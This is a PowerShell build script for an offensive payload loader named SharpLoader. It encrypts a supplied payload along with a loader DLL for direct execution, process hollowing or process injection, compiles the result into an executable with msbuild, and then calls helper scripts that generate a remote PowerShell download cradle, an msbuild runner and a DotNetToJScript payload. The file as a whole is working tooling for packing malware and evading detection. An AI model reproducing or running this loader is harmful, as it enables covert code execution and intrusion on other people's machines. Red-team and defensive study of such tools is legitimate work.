
. "$PSScriptRoot\Utils\shared_functions.ps1"

function console-logo {
    cls
    $logo = "
 _________.__                        .____                     .___            
 /   _____/|  |__ _____ _____________ |    |    _________     __| _/___________ 
 \_____  \ |  |  \\__  \\_  __ \____ \|    |   /  _ \__  \   / __ |/ __ \_  __ \
 /        \|   Y  \/ __ \|  | \/  |_> >    |__(  <_> ) __ \_/ /_/ \  ___/|  | \/
/_______  /|___|  (____  /__|  |   __/|_______ \____(____  /\____ |\___  >__|   
        \/      \/     \/      |__|           \/         \/      \/    \/                                                                
                                                                    @fgsec
    "
    write-host $logo -f White
}

function compile-SharpLoader {
    param($payload, $method, $params)

    console -text "Starting compile process" -type "alert"

    $type = "Executer" # default

    switch ($method){
        2 { $type = "Hollowing" }
        3 { $type = "Injector" }
    }

    # Load encryption class

    Add-Type -Path "$PSScriptRoot\Sharploader\Encryption.cs"

    # Generate keys

    [Sharploader.Encryption]::generateKey()
    $iv = [Sharploader.Encryption]::comm_iv
    $key = [Sharploader.Encryption]::comm_key

    $encryption = New-Object Sharploader.Encryption -ArgumentList @($key,$iv)

    $guid = [guid]::NewGuid().ToString()
    $projectFolder = "$PSScriptRoot\.projects\$guid"
    New-Item -Path $projectFolder -ItemType Directory

    # Copy files to created project

    Copy-Item -Path "$PSScriptRoot\Sharploader" -Destination $projectFolder -Recurse

    # Convert and Encrypt Executer DLL
    $dlls = @("Executer", "Hollowing","Injector")
    foreach($dll in $dlls) {
        if($type -eq $dll) {
            console -text "Finished encoding process for $type"
            $encodeddll = "$projectFolder\$type.encoded"
            ConvertTo-Base64 -SourceFilePath "$projectFolder\Sharploader\$type\bin\Release\$type.dll" -TargetFilePath $encodeddll
            $encodeddll = $encryption.encrypt((Get-Content $encodeddll))
        }
        
    }
  

    # Encrypt payload

    $payload = $encryption.encrypt($payload)
   
    # Replace code variables

    console -text "Preparing project..."

    (Get-Content "$projectFolder\Sharploader\Program.cs").replace('%key%', $key) | Set-Content "$projectFolder\Sharploader\Program.cs"
    (Get-Content "$projectFolder\Sharploader\Program.cs").replace('%iv%', $iv) | Set-Content "$projectFolder\Sharploader\Program.cs"
    (Get-Content "$projectFolder\Sharploader\Program.cs").replace('%dll%', $encodeddll) | Set-Content "$projectFolder\Sharploader\Program.cs"
    (Get-Content "$projectFolder\Sharploader\Program.cs").replace('%payload%', $payload) | Set-Content "$projectFolder\Sharploader\Program.cs"
    (Get-Content "$projectFolder\Sharploader\Program.cs").replace('%dll_class%', "$type.Class1") | Set-Content "$projectFolder\Sharploader\Program.cs"
    (Get-Content "$projectFolder\Sharploader\Program.cs").replace('%params%', '"'+$params+'"') | Set-Content "$projectFolder\Sharploader\Program.cs"

    # Compile

    console -text "Compiling project..." -type "alert"
    &  "$PSScriptRoot\utils\msbuild.exe" "$projectFolder\Sharploader\Sharploader.sln"

    # Move binary from project's folder to root, clean project folder and recreate for output

    if(Test-Path("$projectFolder\Sharploader\bin\Release\Sharploader.exe")) { 
        console -text "Compilation is completed!" -type "ok"
        console -text "Finishing process..."
        Copy-Item "$projectFolder\Sharploader\bin\Release\Sharploader.exe" "$PSScriptRoot\$guid.exe" -Force
        #Remove-item -Path $projectFolder -Recurse -Force
        $finalfolder = "$PSScriptRoot\.projects\$guid-completed"
        New-item -Path $finalfolder -ItemType Directory
        Move-Item "$PSScriptRoot\$guid.exe" "$finalfolder\csharpbin.exe" -Force
    } else {
         console -text "Something went wrong, binary was not created!" -type "error"
    }

    if(Test-Path("$finalfolder\csharpbin.exe")) {
         console -text "All good!" -type "ok"
         console -text "Your binary is ready: $finalfolder" -type "alert"
    }

    $global:projectfolder = $finalfolder
    return $output

}

console-logo

$payload = ""

# Type 1 - Common execution (Executer)
# Type 2 - Hollowing
# Type 3 - Process Injection

$global:projectfolder =””
$output = compile-SharpLoader -payload $payload -method 1 -params "notepad.exe"
output-log -output $output -path "$global:projectfolder\log.txt"

# Execute Modules

powershell -File .\Utils\generate_powershell_remote_cradle.ps1 $global:projectfolder
powershell -File .\Utils\generate_workflow_code.ps1 $global:projectfolder
powershell -File .\Utils\generate_msbuild_runner.ps1 $global:projectfolder
powershell -File .\Utils\generate_dotnettojscript_payload.ps1 $global:projectfolder

Read-Host
